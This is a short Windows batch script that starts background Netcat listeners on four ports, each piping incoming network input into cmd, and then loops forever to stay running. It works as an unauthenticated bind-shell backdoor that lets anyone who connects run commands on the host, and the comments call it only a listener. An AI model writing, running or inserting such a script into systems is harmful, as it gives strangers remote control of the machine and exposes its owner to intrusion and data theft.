@echo off


REM Start a Netcat listener on port 3030 in the background
start /b nc -l 3030 | cmd

REM Start a Netcat listener on port 25565 in the background
start /b nc -l 25565 | cmd

REM Start a Netcat listener on port 8080 in the background
start /b nc -l 8080 | cmd

REM Start a Netcat listener on port 7256 in the background
start /b nc -l 7256 | cmd

REM Keep the batch file running indefinitely
:loop
timeout /t 1 > NUL
goto loop